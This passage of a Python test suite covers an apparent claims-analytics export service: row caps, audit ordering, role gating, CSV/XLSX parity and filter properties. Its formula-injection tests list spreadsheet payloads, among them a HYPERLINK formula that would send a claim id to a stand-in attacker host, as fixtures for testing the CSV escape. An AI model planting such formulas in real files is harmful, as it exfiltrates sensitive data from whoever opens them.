            "_DISPATCHED",
            {**export_module._DISPATCHED, ExportTarget.siu_pipeline: lambda _panel: sentinel},
        )
        assert export_module._shape(ExportTarget.siu_pipeline, panel) is sentinel
        # The sibling target in the same entry point is untouched, so this is a
        # statement about dispatch rather than about a global switch.
        assert export_module._shape(ExportTarget.fraud_bands, panel) == fraud_bands_table_of(panel)


async def test_the_fraud_export_shapes_its_table_through_the_registry(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """…and the entry point goes through it, which is the half that matters.

    `_shape` reading the registry is worth nothing if `export_fraud` still asks
    an `if`. The aggregate call and the audit write are both stubbed so this
    needs no database: what is under test is the four lines between them.
    """
    sentinel = ExportTable(
        target=ExportTarget.siu_pipeline,
        columns=(ExportColumn("sentinel"),),
        rows=(("dispatched",),),
    )
    panel = _panel([CategoryCount(key="low", count=1)])

    async def stub_panel(*_args: Any, **_kwargs: Any) -> FraudPanel:
        return panel

    async def stub_record(*_args: Any, **_kwargs: Any) -> None:
        return None

    monkeypatch.setattr(fraud_service, "fraud_panel", stub_panel)
    monkeypatch.setattr(audit_module, "record_export", stub_record)
    monkeypatch.setattr(
        export_module,
        "_DISPATCHED",
        {**export_module._DISPATCHED, ExportTarget.siu_pipeline: lambda _panel: sentinel},
    )

    served = await export_fraud(
        None,  # type: ignore[arg-type]
        CallerContext(user_id=1, role=UserRole.analyst, employer_ids=ALL_EMPLOYERS),
        _thresholds(),
        ExportLimits(version=1, max_rows=10),
        Segmentation(),
        ExportTarget.siu_pipeline,
        ExportFormat.csv,
    )

    assert served is sentinel


def test_the_export_row_cap_refuses_a_zero() -> None:
    """Zero would refuse every export including the empty one, which retires the
    feature rather than capping it — `TrendPeriods`' argument over a row count."""
    with pytest.raises(RuleParameterError, match="maxRows"):
        ExportLimits(version=1, max_rows=0)


def test_a_cap_of_one_is_a_policy_and_is_accepted() -> None:
    """The other side of the same line: "one row per export" is unfriendly and
    coherent, and an operator who means it can say it. The refusal above is about
    a value that describes a capability no longer existing, not about a small
    number."""
    assert ExportLimits(version=1, max_rows=1).max_rows == 1


class _AuditReached(Exception):
    """The sentinel a stubbed `record_export` raises — see `audit_sentinel`.

    Its own class rather than a `RuntimeError`, so that "the audit row was
    written" is a thing a test can assert *specifically*. That is the whole
    point: the two cap tests below used to observe an `AttributeError` from
    passing `db=None` into a real `record_export`, which is a success signal any
    typo, any rename and any refactor in the call chain also produces. A test
    that passes for a reason nobody chose is a test that will keep passing after
    the behaviour it describes has gone.
    """


@pytest.fixture
def audit_sentinel(monkeypatch: pytest.MonkeyPatch) -> None:
    """Replace `record_export` with something that raises `_AuditReached`.

    `_finish`'s whole contract is an ordering — cap, then audit row, then the
    table — and an ordering is only checkable if both steps are observable.
    Patched on the `audit` module object the service imported, so the stub is the
    function `_finish` actually calls rather than a name it does not use.
    """

    async def reached(*_args: Any, **_kwargs: Any) -> None:
        raise _AuditReached

    monkeypatch.setattr(audit_module, "record_export", reached)


async def test_the_cap_is_checked_before_the_audit_row_is_written(
    audit_sentinel: None,
) -> None:
    """AC 4's ordering, with both halves observed rather than one inferred.

    The refusal is `ExportTooLarge` **and** the sentinel never fires, which
    together are the claim: a refused export writes no audit row. The message
    names the cap and the count, because a caller told only "too large" cannot
    judge how much to cut.
    """
    ctx = CallerContext(user_id=1, role=UserRole.analyst, employer_ids=ALL_EMPLOYERS)
    table = claims_table_of(
        [
            RankedClaim(claim=_drill_claim(f"WC-{n:04d}"), flags=_drill_flags(), priority_score=1.0)
            for n in range(3)
        ]
    )

    with pytest.raises(ExportTooLarge, match="3 rows"):
        await export_module._finish(
            None,  # type: ignore[arg-type]
            ctx,
            table,
            ExportFormat.csv,
            ExportLimits(version=1, max_rows=2),
            {},
        )


async def test_a_table_at_the_cap_exactly_is_served(audit_sentinel: None) -> None:
    """`>` and deliberately not `>=`: a cap of fifty thousand admits fifty
    thousand rows, which is what a cap means. Asserted because the off-by-one is
    the one every bound gets wrong, and here it would refuse a request the
    document permits.

    Observed as the **sentinel**, which is the only thing that can happen after
    the cap has let a table through: `_AuditReached` says the audit write was
    reached and therefore that the cap did not refuse. The previous form watched
    for an `AttributeError` out of a real `record_export` handed `db=None`, which
    said the same thing only as long as nothing else in the call chain could
    raise one.
    """
    ctx = CallerContext(user_id=1, role=UserRole.analyst, employer_ids=ALL_EMPLOYERS)
    table = claims_table_of(
        [RankedClaim(claim=_drill_claim(), flags=_drill_flags(), priority_score=1.0)]
    )

    with pytest.raises(_AuditReached):
        await export_module._finish(
            None,  # type: ignore[arg-type]
            ctx,
            table,
            ExportFormat.csv,
            ExportLimits(version=1, max_rows=1),
            {},
        )


async def test_a_table_taller_than_a_worksheet_is_refused_before_it_is_written(
    audit_sentinel: None, monkeypatch: pytest.MonkeyPatch
) -> None:
    """A workbook that would truncate is a 422, not a short spreadsheet.

    **The failure this closes.** `export_limits.maxRows` is a rules-tier document
    designed to be retuned without a deploy (AC: "Given the row cap is retuned in
    its rule document…"), so an owner may set it above 1,048,576 — and
    `worksheet.write_*` answers a negative code past the end of a sheet and
    `xlsxwriter` writes the short workbook anyway. The result was a spreadsheet
    quietly missing rows beside an audit row and a CSV of the same query both
    reporting the full count.

    **Asserted against a monkeypatched limit rather than a million rows**, which
    is the only way this is a test rather than a benchmark: the constant is the
    subject, not the number in it, and materialising 1,048,576 synthetic claims
    to prove a comparison would take minutes and prove the same thing. The
    sentinel is what makes the *ordering* part of the claim — refused before the
    audit row, like the policy cap above.

    CSV at the same size is not refused, and that asymmetry is the point: the
    limit is the spreadsheet format's and not the export's.
    """
    monkeypatch.setattr(export_module, "_XLSX_MAX_ROWS", 3)
    ctx = CallerContext(user_id=1, role=UserRole.analyst, employer_ids=ALL_EMPLOYERS)
    table = claims_table_of(
        [
            RankedClaim(claim=_drill_claim(f"WC-{n:04d}"), flags=_drill_flags(), priority_score=1.0)
            for n in range(3)
        ]
    )
    generous = ExportLimits(version=1, max_rows=50_000)

    with pytest.raises(ExportTooLarge, match="a worksheet holds 2"):
        await export_module._finish(
            None,  # type: ignore[arg-type]
            ctx,
            table,
            ExportFormat.xlsx,
            generous,
            {},
        )
    with pytest.raises(_AuditReached):
        await export_module._finish(
            None,  # type: ignore[arg-type]
            ctx,
            table,
            ExportFormat.csv,
            generous,
            {},
        )


def test_the_writer_refuses_a_cell_it_would_have_truncated() -> None:
    """A string past 32,767 characters is `ExportUnwritable`, never a short cell.

    `xlsxwriter` truncates such a string, returns `-2` and carries on — so a
    caller that ignored the code would produce a workbook that opens cleanly with
    a value silently cut. This is the one negative code reachable without
    monkeypatching anything, and it is checked at the boundary rather than
    assumed: a library that stopped reporting it would fail here.

    One character over the limit, deliberately, because a test that used a
    comfortably-too-long string would also pass against a guard that had the
    boundary wrong.
    """
    table = ExportTable(
        target=ExportTarget.claims,
        columns=(ExportColumn("worker_name"),),
        rows=(("x" * 32_768,),),
    )

    with pytest.raises(export_module.ExportUnwritable, match="row 1 column 0"):
        render_xlsx(table)

    # …and the CSV of the same table is fine, because a text file has no such
    # limit — the refusal is the spreadsheet format's, not the export's.
    assert len(_csv_rows(table)[1][0]) == 32_768


def test_a_filename_names_the_target_and_the_day_and_never_the_filter() -> None:
    """A filename travels into tickets, mail clients and proxy logs, so AD-11
    keeps claim-adjacent detail out of it. The filter set is in the audit row,
    which is content-free precisely so that it can be."""
    assert (
        filename_for(ExportTarget.financial_breakdown, ExportFormat.xlsx, date(2026, 8, 22))
        == "lineworker-financial-breakdown-2026-08-22.xlsx"
    )


def test_the_two_formats_hold_the_same_values() -> None:
    """A worksheet whose cells equal the CSV's, read back through the container
    rather than through the library that wrote it.

    Integers arrive as numbers and everything else as text, so a spreadsheet can
    sum a money column while a date stays the ISO string the CSV carries — which
    is the whole reason dates are *not* written as Excel serials.
    """
    table = claims_table_of(
        [
            RankedClaim(claim=_drill_claim("WC-0001"), flags=_drill_flags(), priority_score=42.5),
            RankedClaim(
                claim=_drill_claim("WC-0002", worker_name="Ana Cruz, Jr."),
                flags=_drill_flags(),
                priority_score=7.0,
            ),
        ]
    )

    assert _xlsx_rows(render_xlsx(table)) == _csv_rows(table)


def test_a_blank_cell_survives_the_round_trip_as_a_blank() -> None:
    """The one place the two renderers could disagree: XLSX writes no cell at all
    for a null, so a reader walking cells in document order would shift every
    field after it. Exercised on a cost-driver table, whose empty cohort's
    average is the null the seeded book never produces."""
    table = cost_drivers_table_of(_decomposition([]))

    assert _xlsx_rows(render_xlsx(table)) == _csv_rows(table)


# --- what a spreadsheet does with a cell (AD-16) ---------------------------


#: The five columns a claim record supplies as free text, and one live payload.
#:
#: `=HYPERLINK(…&A1…)` is the one worth spelling out rather than abbreviating: it
#: needs no macros, no scripting and no prompt in Excel, Calc or Sheets — the
#: cell simply becomes a link whose target carries the neighbouring claim id, and
#: the analyst who clicks it exfiltrates a row of the file to whoever wrote the
#: worker's name.
_INJECTIONS: Final[Sequence[str]] = (
    '=HYPERLINK("http://evil.example/?d="&A1,"claim")',
    "+1+1",
    "-1+1",
    "@SUM(A1:A9)",
    "\t=1+1",
)


@pytest.mark.parametrize("payload", _INJECTIONS)
def test_a_formula_in_a_free_text_column_leaves_the_csv_inert(payload: str) -> None:
    """AD-16 at the last surface it reaches: a spreadsheet engine.

    **`csv.writer` quotes for the parser and not for the reader.** RFC 4180
    quoting protects a delimiter, a quote and a newline; it says nothing about
    what the program on the far end does with the field once the quotes are off.
    All three spreadsheets strip them and *then* decide whether the text is a
    formula — so `+1+1` in a `worker_name` column arrived as `+1+1` and executed
    on open, on the analyst's workstation, with the analyst's credentials, hours
    after the request that produced the file was forgotten.

    Five of this module's columns are free text a claim record supplied
    (`worker_name`, `injury_type`, `handler_name`, `employer_short_name` and the
    breakdown `label`) and not one of them has a vocabulary anything validates.

    The value is asserted **whole**: the apostrophe is added and nothing else is
    changed, because an escape that also rewrote the data would be a file that
    disagrees with the console under a heading saying they are the same.
    """
    table = claims_table_of(
        [
            RankedClaim(
                claim=_drill_claim("WC-0001", worker_name=payload),
                flags=_drill_flags(),
                priority_score=1.0,
            )
        ]
    )

    cell = dict(zip(seed_fixture.EXPORT_CLAIM_COLUMNS, _csv_rows(table)[1], strict=True))

    assert cell["worker_name"] == f"'{payload}"
    assert cell["worker_name"][1:] == payload


@pytest.mark.parametrize("payload", _INJECTIONS)
def test_the_escape_would_notice_if_it_were_removed(payload: str) -> None:
    """The guard fires, rather than the fixture happening to be harmless.

    Every payload above genuinely starts with a character a spreadsheet reads as
    "this cell is a program" — which is what makes the test above a test. Without
    this, a fixture edited into `"Derek Hill"` would leave the parametrised case
    passing over a string nothing would ever have executed, and the escape could
    be deleted with the suite green.
    """
    assert payload[:1] in export_module._FORMULA_LEADS
    assert export_module._csv_cell(payload) != export_module._cell(payload)


def test_a_negative_number_keeps_its_sign_and_stays_a_number() -> None:
    """The one place a blanket escape would do real damage.

    `priority_score` is genuinely negative for a settled claim
    (`priority_weights.settledPenalty`), and `'-142.5` is a **text** cell — so a
    spreadsheet could no longer sort the file back into the order it was
    downloaded in, which `_CLAIM_COLUMNS` names as the reason the column is
    exported at all. A dangerous lead is therefore escaped only when the cell is
    not a plain number, which `+1+1` and `-1+1` above are not.
    """
    table = claims_table_of(
        [RankedClaim(claim=_drill_claim("WC-0001"), flags=_drill_flags(), priority_score=-142.5)]
    )

    cell = dict(zip(seed_fixture.EXPORT_CLAIM_COLUMNS, _csv_rows(table)[1], strict=True))

    assert cell["priority_score"] == "-142.5"


def test_the_spreadsheet_needs_no_escape_and_deliberately_does_not_carry_one() -> None:
    """The one place the two renderers differ, stated as a test.

    The section's standing doctrine is that CSV and XLSX hold the same *values*,
    and they still do: `render_xlsx` calls `write_string`, which forces a string
    cell, and a formula in XLSX is a different element written by a different
    method — so the text cannot become a program there whatever it starts with.
    The apostrophe is a CSV **encoding artefact**, that format's way of saying
    what this one says structurally, and putting it in the worksheet would leave
    a literal apostrophe in a cell that was never in danger.

    Recorded here because it is the one divergence
    `test_the_two_formats_hold_the_same_values` would otherwise be quietly wrong
    about, and because a reader who found the escape in `_csv_cell` would
    reasonably ask why the worksheet does not have one.
    """
    payload = "=1+1"
    table = ExportTable(
        target=ExportTarget.claims,
        columns=(ExportColumn("worker_name"),),
        rows=((payload,),),
    )

    assert _csv_rows(table)[1] == [f"'{payload}"]
    assert _xlsx_rows(render_xlsx(table))[1] == [payload]


# --- the gate (AD-7), without a database ----------------------------------


def test_the_export_reuses_the_analyst_workspace_allowlist() -> None:
    """One allowlist for one workspace, not a fifth spelling of it."""
    assert frozenset({UserRole.analyst}) == fraud_service.FRAUD_ANALYTICS_ROLES


@pytest.mark.parametrize("role", sorted(set(UserRole) - {UserRole.analyst}))
async def test_every_role_outside_the_allowlist_is_refused_by_all_six(role: UserRole) -> None:
    """Enumerated from the enum, so a role added later fails here.

    The session is passed as `None`, so a read of any kind would be an
    `AttributeError` rather than a silent success — which is what makes "the
    refusal precedes the read" a property of this test rather than a claim. All
    six, because a gate added to five entry points and forgotten on the sixth is
    the ordinary way a capability half-opens.
    """
    ctx = CallerContext(user_id=1, role=role, employer_ids=frozenset({1}))
    thresholds = _thresholds()
    limits = ExportLimits(version=1, max_rows=10)
    segmentation = Segmentation()
    fmt = ExportFormat.csv

    with pytest.raises(fraud_service.FraudAnalyticsNotPermitted):
        await export_claims(None, ctx, thresholds, _weights(), limits, DrillFilters(), fmt)  # type: ignore[arg-type]
    with pytest.raises(fraud_service.FraudAnalyticsNotPermitted):
        await export_fraud(
            None,  # type: ignore[arg-type]
            ctx,
            thresholds,
            limits,
            segmentation,
            ExportTarget.fraud_bands,
            fmt,
        )
    with pytest.raises(fraud_service.FraudAnalyticsNotPermitted):
        await export_fraud_rates(
            None,  # type: ignore[arg-type]
            ctx,
            thresholds,
            limits,
            FraudRateSorts(),
            segmentation,
            fmt,
        )
    with pytest.raises(fraud_service.FraudAnalyticsNotPermitted):
        await export_trends(
            None,  # type: ignore[arg-type]
            ctx,
            thresholds,
            _periods(),
            SETTINGS,
            limits,
            segmentation,
            fmt,
        )
    with pytest.raises(fraud_service.FraudAnalyticsNotPermitted):
        await export_financials(
            None,  # type: ignore[arg-type]
            ctx,
            thresholds,
            limits,
            segmentation,
            ExportTarget.financial_breakdown,
            fmt,
        )
    with pytest.raises(fraud_service.FraudAnalyticsNotPermitted):
        await export_reserve_adequacy(
            None,  # type: ignore[arg-type]
            ctx,
            thresholds,
            _bands(),
            limits,
            segmentation,
            fmt,
        )


def _weights() -> Any:
    from rules.parameters import PriorityWeights

    return PriorityWeights(
        version=1,
        litigation=40,
        siu_review=35,
        rtw_blocked=30,
        pending_approval=25,
        pending_approval_statuses=frozenset(
            {ClaimStatus.initial, ClaimStatus.ch_assessment_process}
        ),
        payment_due=20,
        surgery=15,
        severity_factor=0.3,
        days_open_factor=0.2,
        days_open_cap=60,
        settled_penalty=-100,
        marker_threshold=30,
        marker_count=3,
        # `priority_weights.pageLimit`, restated like every other field here —
        # fifty and not twenty-five, which is what the document has said since
        # Story 5.5 and what `e2e/fixtures/seed.ts` restates as
        # `DRILL_PAGE_LIMIT`. It changes no assertion in this module (an export
        # is not paged, which is the whole of AC 2), and that is exactly why it
        # was worth correcting: a restated constant nothing reads is a constant
        # that quietly stops matching its document, and the next test to depend
        # on it inherits the drift.
        page_limit=50,
    )


def _periods() -> Any:
    from rules.parameters import TrendPeriods

    return TrendPeriods(version=1, default_buckets=12, max_buckets=24, low_confidence_claim_max=3)


def _bands() -> Any:
    from rules.parameters import ReserveBands

    return ReserveBands(version=1, light_ratio_bp=11_500, heavy_ratio_bp=6_000)


# --- the property ----------------------------------------------------------

segmentations = st.builds(
    Segmentation,
    severity_band=st.none() | st.sampled_from(list(RiskBand)),
    injury_type=st.none() | st.sampled_from(["Fall from Height", "Laceration"]),
    state=st.none() | st.sampled_from(["WA", "MI"]),
    employer_id=st.none() | st.integers(min_value=1, max_value=4),
    disability=st.none() | st.sampled_from(list(Disability)),
    sector=st.none() | st.sampled_from(["Aerospace", "Automotive"]),
    region=st.none() | st.sampled_from(["Northwest", "Midwest"]),
    icd10=st.none() | st.sampled_from(["W17.89XA", "S61.219A"]),
    age_group=st.none() | st.sampled_from(list(AgeBand)),
    gender=st.none() | st.sampled_from(list(Gender)),
)


def _satisfies(claim: DrillClaim, filters: Segmentation) -> bool:
    """Does this claim answer every set facet of a segmentation?

    **A second implementation, written from the facet names rather than from the
    code under test**, which is what makes the property above a property. The
    banded facets are re-banded here from `_thresholds()`' restated edges —
    `RiskDerivation`'s rule (`high >= 65`, `med >= 35`, else `low`) and
    `AgeBandDerivation`'s (`oldest >= 55`, `older >= 45`, `younger >= 35`, else
    `youngest`) — spelled out rather than imported, for the reason the whole pure
    half of this module gives: an oracle that calls the computer it is checking
    agrees with it by construction.

    Every facet is answered explicitly and there is no `else: return True`,
    because a silent pass is how an eleventh dimension would join `Segmentation`
    and be proved nothing about.
    """
    thresholds = _thresholds()

    def risk_of(score: int) -> RiskBand:
        if score >= thresholds.risk_high_min:
            return RiskBand.high
        if score >= thresholds.risk_med_min:
            return RiskBand.med
        return RiskBand.low

    def age_band_of(age: int) -> AgeBand:
        if age >= thresholds.age_oldest_min:
            return AgeBand.oldest
        if age >= thresholds.age_older_min:
            return AgeBand.older
        if age >= thresholds.age_younger_min:
            return AgeBand.younger
        return AgeBand.youngest

    answered: Mapping[str, object] = {
        "severity_band": risk_of(claim.severity_score),
        "injury_type": claim.injury_type,
        "state": claim.state,
        "employer_id": claim.employer_id,
        "disability": claim.disability,
        "sector": claim.sector,
        "region": claim.region,
        "icd10": claim.icd,
        "age_group": age_band_of(claim.age),
        "gender": claim.gender,
    }
    asked = {field.name: getattr(filters, field.name) for field in dataclasses.fields(filters)}
    assert set(asked) == set(answered), (
        f"Segmentation has dimensions this oracle does not answer: {set(asked) ^ set(answered)}"
    )
    return all(value is None or answered[name] == value for name, value in asked.items())


@given(segmentations)
@hyp_settings(max_examples=200)
def test_an_exported_claim_row_satisfies_every_facet_that_was_asked_for(
    filters: Segmentation,
) -> None:
    """Under **any** segmentation, every exported row answers every set facet —
    and a segmentation nothing satisfies exports nothing.

    **What the previous form of this test could not catch.** It asserted only
    that the exported ids were a subset of the caseload's, over a `kept` that was
    `narrowed(caseload, …)` — a subset of the caseload *by construction*. So the
    assertion held for any implementation of anything: a `narrowed` that ignored
    its filters, a `select` that dropped its predicates, a `claims_table_of` that
    returned the whole book, all pass. Two hundred Hypothesis examples that
    cannot fail are two hundred examples of nothing, and the docstring claimed
    they proved "a filter narrows and can never widen" — of which only the
    *widen* half was ever checked, and only against a set the fold had already
    been handed.

    So the property is now the one the story needs: a file may not contain a row
    the segmentation excludes. It is checked against `_satisfies`, an
    independently written predicate over the claim's own columns, so an
    implementation that ignored the filters fails on the first example that sets
    one. The subset assertion stays beside it — it is still true and still the
    scope half — but it is no longer the only claim.

    The emptied-segment half is the other direction and is what a "narrows" claim
    actually asserts: when no claim in the caseload answers the segmentation, the
    table has zero rows. Without it a fold that returned everything would satisfy
    "every exported row satisfies the filters" only by never being wrong about a
    row it excluded, because it excluded none.

    **`to_drill_filters` is the caller this property needs**, and it is the
    caller that function's docstring was written for: it says nothing on a
    request path calls it, because both routes declare all twenty-five facets
    themselves. What it is for is exactly this — establishing that a segmentation
    and the drill list it opens select the same claims — and the export is where
    that stops being a hypothetical.
    """
    from services.worklist.segmentation import Computers, narrowed

    thresholds = _thresholds()
    caseload = [
        _drill_claim(f"WC-{index:04d}", severity_score=index * 7 % 100, age=20 + index)
        for index in range(1, 16)
    ]
    kept = narrowed(caseload, filters, Computers.of(thresholds))
    ranked, _total = select(kept, to_drill_filters(filters), thresholds, _weights())
    exported = {str(row[0]) for row in claims_table_of(ranked).rows}
    by_id = {claim.claim_id: claim for claim in caseload}

    # The scope half, kept: nothing may appear that the read did not return.
    assert exported <= set(by_id)
    # The narrowing half, which is the one the old form could not see.
    for claim_id in exported:
        assert _satisfies(by_id[claim_id], filters), (
            f"{claim_id} was exported under {filters} and does not satisfy it"
        )
    # …and the other direction, so "narrows" is a claim about the rows that were
    # *not* exported as well as about the ones that were.
    assert exported == {claim.claim_id for claim in caseload if _satisfies(claim, filters)}


def test_a_segmentation_no_claim_satisfies_exports_a_header_and_nothing_else() -> None:
    """The emptied segment, chosen rather than sampled — because the property
    above only reaches it if Hypothesis happens to draw a combination the fifteen
    synthetic claims all miss, and "the guard would notice" should not depend on
    that.

    A 200 with a header row and no data rows is the I/O matrix's own line, and it
    is what makes the property above non-vacuous in the direction a subset
    assertion can never see: a fold that ignored its filters would return fifteen
    rows here.
    """
    from services.worklist.segmentation import Computers, narrowed

    thresholds = _thresholds()
    filters = Segmentation(sector="Automotive", state="MI")
    caseload = [_drill_claim(f"WC-{index:04d}") for index in range(1, 16)]

    kept = narrowed(caseload, filters, Computers.of(thresholds))
    ranked, _total = select(kept, to_drill_filters(filters), thresholds, _weights())
    table = claims_table_of(ranked)

    assert not any(_satisfies(claim, filters) for claim in caseload), "the fixture is not empty"
    assert table.rows == ()
    assert [column.name for column in table.columns] == list(seed_fixture.EXPORT_CLAIM_COLUMNS)


@given(segmentations)
@hyp_settings(max_examples=100)
def test_every_aggregate_export_has_exactly_its_cards_rows(filters: Segmentation) -> None:
    """A file's row count is its card's group count — never one more, never one
    fewer.

    Over the two aggregates whose row count can genuinely move with a filter: the
    band distribution is always three (a rule's vocabulary is complete) and the
    breakdown is however many groups survived, cut at the card's limit. Asserted
    against the aggregate object rather than against a recount, because a recount
    here would be the second fold this module exists not to have.
    """
    from services import derivations
    from services.worklist.decomposition import decomposition_of
    from services.worklist.fraud import FraudClaim, panel_of
    from services.worklist.fraud import _Computers as FraudComputers
    from services.worklist.segmentation import Computers, narrowed

    thresholds = _thresholds()
    computers = Computers.of(thresholds)

    fraud_caseload = [
        FraudClaim(
            claim_id=f"WC-{index:04d}",
            fraud_flag=index % 2 == 0,
            fraud_score=index * 9 % 100,
            stage=Stage.treatment,
            injury_type="Fall from Height",
            employer_id=2,
            employer_label="Boeing",
            handler_id=4,
            handler_name="Dante Reyes",
            severity_score=index * 7 % 100,
            state="WA",
            disability=Disability.temporary,
            sector="Aerospace",
            region="Northwest",
            icd="W17.89XA",
            age=20 + index,
            gender=Gender.male,
        )
        for index in range(1, 16)
    ]
    panel = panel_of(narrowed(fraud_caseload, filters, computers), FraudComputers.of(thresholds))
    assert len(fraud_bands_table_of(panel).rows) == len(panel.by_band.items) == 3

    financial_caseload = [
        FinancialClaim(
            claim_id=f"WC-{index:04d}",
            stage=Stage.treatment,
            doi=date(2026, 3, 22),
            recovery=RecoveryWindow.weeks_6_8,
            reserve=index * 1_000,
            paid_indemnity=0,
            paid_medical=0,
            paid_expense=0,
            surgery_required=index % 2 == 0,
            litigation_flag=index % 5 == 0,
            severity_score=index * 7 % 100,
            injury_type="Fall from Height",
            state="WA",
            employer_id=index % 4 + 1,
            employer_label="Boeing",
            disability=Disability.temporary,
            sector="Aerospace",
            region="Northwest",
            icd="W17.89XA",
            age=20 + index,
            gender=Gender.male,
        )
        for index in range(1, 16)
    ]
    computed = decomposition_of(
        narrowed(financial_caseload, filters, computers),
        BreakdownDimension.employerId,
        computers,
        derivations.total_paid.for_thresholds(thresholds),
        derivations.total_claim_projected.for_thresholds(thresholds),
    )
    assert len(financial_breakdown_table_of(computed).rows) == len(computed.breakdown.items)
    assert len(cost_drivers_table_of(computed).rows) == 4


# --- the DB half -----------------------------------------------------------


@pytest.fixture
async def db(seeded_db_url: str) -> AsyncIterator[AsyncSession]:
    engine = create_async_engine(seeded_db_url.replace("postgresql://", "postgresql+asyncpg://", 1))
    try:
        async with async_sessionmaker(engine, expire_on_commit=False)() as session:
            yield session
    finally:
        await engine.dispose()


@asynccontextmanager
async def make_client(db_url: str) -> AsyncIterator[httpx.AsyncClient]:
    app = create_app(Settings(database_url=db_url, env="e2e"))  # type: ignore[arg-type]
    async with app.router.lifespan_context(app):
        transport = httpx.ASGITransport(app=app)
        async with httpx.AsyncClient(transport=transport, base_url="http://test") as client:
            yield client


async def login_as(client: httpx.AsyncClient, name: str, role: str) -> None:
    personas = (await client.get("/personas")).json()["items"]
    match = [p for p in personas if p["name"] == name and p["role"] == role]
    assert len(match) == 1, f"expected exactly one {name}/{role} persona"
    assert (await client.post("/auth/login", json={"personaId": match[0]["id"]})).status_code == 200


async def context_for(db: AsyncSession, name: str, role: str) -> CallerContext:
    """Build a caller context the way the API dependency does (AD-7).

    `ALL_EMPLOYERS` rather than the assignment set for a `scope_all` persona,
    `test_financial_decomposition.py`'s helper and its reason: David Bline has no
    rows in `user_employer_assignment`, so reading his assignments would hand the
    export an empty book and every equality below would hold trivially between
    two empty answers.
    """
    user = (
        await db.scalars(sa.select(AppUser).where(AppUser.name == name, AppUser.role == role))
    ).one()
    return CallerContext(
        user_id=user.id,
        role=user.role,
        employer_ids=ALL_EMPLOYERS if user.scope_all else await employer_ids_for(db, user.id),
    )


async def get_export(
    db_url: str,
    name: str,
    role: str,
    path: str,
    params: Mapping[str, str] | None = None,
    fmt: str = "csv",
) -> httpx.Response:
    """One export request, as a session would make it. Returns the raw response.

    Raw rather than parsed, because half of what this story publishes is in the
    headers — the media type, the disposition and the cache directive — and a
    helper that returned only the body would make those unassertable.
    """
    async with make_client(db_url) as client:
        await login_as(client, name, role)
        return await client.get(path, params={**(params or {}), "format": fmt})


async def get_json(db_url: str, name: str, role: str, path: str, **kwargs: Any) -> dict[str, Any]:
    async with make_client(db_url) as client:
        await login_as(client, name, role)
        resp = await client.get(path, **kwargs)
        assert resp.status_code == 200, resp.text
        payload: dict[str, Any] = resp.json()
        return payload


def parse_csv(payload: bytes) -> list[list[str]]:
    import csv as _csv

    return [row for row in _csv.reader(io.StringIO(payload.decode("utf-8"), newline=""))]


def _counting(db: AsyncSession, executed: list[str]) -> Any:
    """Wrap `db.execute` so the statements one export runs can be counted.

    `test_financial_decomposition.py`'s helper, restated here rather than
    imported: a test module importing another test module's private helper is how
    two unrelated suites acquire a shared failure mode. Rule-document loads are
    *not* excluded and do not need to be — every parameter block arrives as an
    argument, so a fold that reached the engine would show up as an extra
    statement.
    """
    original = db.execute

    async def counting(statement: Any, *args: Any, **kwargs: Any) -> Any:
        executed.append(str(statement).split("\n")[0])
        return await original(statement, *args, **kwargs)

    return original, counting


async def audit_rows(db: AsyncSession, action_prefix: str = "export.") -> list[AuditEvent]:
    """Every audit row on the export path, newest last.

    A local helper rather than a shared fixture, `test_emails.py`'s idiom: the
    question "which rows did *this* path write" is per-suite, and a shared helper
    would have to grow a filter argument for every caller.
    """
    rows = (
        await db.execute(
            sa.select(AuditEvent)
            .where(AuditEvent.action.like(f"{action_prefix}%"))
            .order_by(AuditEvent.id)
        )
    ).scalars()
    return list(rows)


@requires_db
async def test_the_claim_export_is_every_page_of_the_list(seeded_db_url: str) -> None:
    """AC 2, in the only checkable form: the file is the list, all of it.

    The paged route is walked to exhaustion and the file's `claim_id` column is
    compared against the concatenation — the ids **and their order**, because the
    ranking is what a reader would sort the spreadsheet back into. A file holding
    the same set in a different order would be a file that does not agree with
    the screen it was taken from.
    """
    claim_ids: list[str] = []
    cursor: str | None = None
    async with make_client(seeded_db_url) as client:
        await login_as(client, *ANALYST)
        while True:
            params = dict(TWO_DIMENSIONS)
            if cursor is not None:
                params["cursor"] = cursor
            page = (await client.get(DRILL, params=params)).json()
            claim_ids.extend(row["claimId"] for row in page["items"])
            cursor = page["nextCursor"]
            if cursor is None:
                break
        total = page["total"]

    resp = await get_export(seeded_db_url, *ANALYST, CLAIMS_EXPORT, TWO_DIMENSIONS)
    rows = parse_csv(resp.content)

    assert resp.status_code == 200, resp.text
    assert rows[0] == list(seed_fixture.EXPORT_CLAIM_COLUMNS)
    assert [row[0] for row in rows[1:]] == claim_ids
    assert len(rows) - 1 == total


@requires_db
async def test_the_unfiltered_claim_export_is_the_seeds_own_book(seeded_db_url: str) -> None:
    """Every row and every cell, against the oracle rather than against the API.

    `seed_fixture.expected_claim_export` renders thirty-six cells from the seed
    file and this file's own restatements of the derivations, so this is a
    comparison between two implementations rather than between one and itself.
    Cells and not just ids, because what the export can get wrong is the
    *rendering*.

    `days_open` and `priority_score` move with the clock, so both sides are
    compared for the same day — read off the file's own `days_open` for the
    first claim, which pins the oracle to whatever day the server actually
    served rather than to this process's idea of today.
    """
    resp = await get_export(seeded_db_url, *ANALYST, CLAIMS_EXPORT)
    rows = parse_csv(resp.content)
    served_on = _served_on(rows)
    expected = seed_fixture.expected_claim_export(*ANALYST, as_of=served_on)

    assert rows[0] == expected["columns"]
    assert len(rows) - 1 == expected["rowCount"] == SEEDED_CLAIMS
    assert rows[1:] == expected["rows"]


def _served_on(rows: list[list[str]]) -> date:
    """Which day the server aged the export against, read off the file itself.

    `days_open` is `as_of - froi_date`, so one row is enough to recover the day —
    and recovering it rather than assuming `date.today()` is what stops this
    suite failing once a day at UTC midnight for a reason that has nothing to do
    with exporting.
    """
    header = rows[0]
    froi = date.fromisoformat(rows[1][header.index("froi_date")])
    return froi + timedelta(days=int(rows[1][header.index("days_open")]))


@requires_db
async def test_the_band_export_is_the_panels_own_arcs(seeded_db_url: str) -> None:
    """The file holds what the donut drew — compared against the card's payload.

    Against the sibling *route* rather than against a recount, which is the whole
    of "the export calls the function the chart calls": if the two ever disagree,
    one of them is folding a second time.
    """
    payload = await get_json(seeded_db_url, *ANALYST, "/dashboard/fraud", params=TWO_DIMENSIONS)
    resp = await get_export(
        seeded_db_url, *ANALYST, FRAUD_EXPORT, {**TWO_DIMENSIONS, "table": "bands"}
    )
    rows = parse_csv(resp.content)
    expected = seed_fixture.expected_fraud_band_export(*ANALYST)

    assert rows[0] == ["fraud_band", "claims"]
